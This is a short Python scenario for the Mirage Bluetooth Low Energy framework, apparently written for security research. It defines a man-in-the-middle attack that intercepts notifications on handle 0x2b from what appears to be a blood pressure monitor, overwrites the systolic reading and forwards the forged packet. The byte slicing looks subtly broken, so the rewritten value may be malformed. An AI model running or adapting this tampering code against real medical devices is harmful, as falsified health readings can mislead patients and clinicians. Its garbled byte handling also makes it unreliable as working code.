from mirage.core import scenario
from mirage.libs import io,ble,esb,utils

class mitm_attack(scenario.Scenario):

    def onSlaveHandleValueNotification(self, packet):
        # If the packet has a handle of 0x2b and a packet value of 0x00
        if packet.handle == 0x2b and 0x00 in packet.value:
            packet.show()

            # The indexes of the data
            index_sys = 1
            index_dia = 3
            index_hr = 14

            # Create a new packet by modifying the systolic value to 0
            newValue = packet.value[:index_sys] + bytes(0x01)
            newValue2 = packet.value[2:]
            io.info("Value modified to: " +newValue.hex()+ newValue2.hex())

            # Emit the new packet to the slave
            self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle, value = bytes(newValue) + bytes(newValue2)))

            return False

        else:
            return True

    def onStart(self):
        self.a2sEmitter = self.module.a2sEmitter
        self.a2sReceiver = self.module.a2sReceiver
        self.a2mEmitter = self.module.a2mEmitter
        self.a2mReceiver = self.module.a2mReceiver
        return True

    def onEnd(self):
        return True

    def onKey(self,key):
        return True
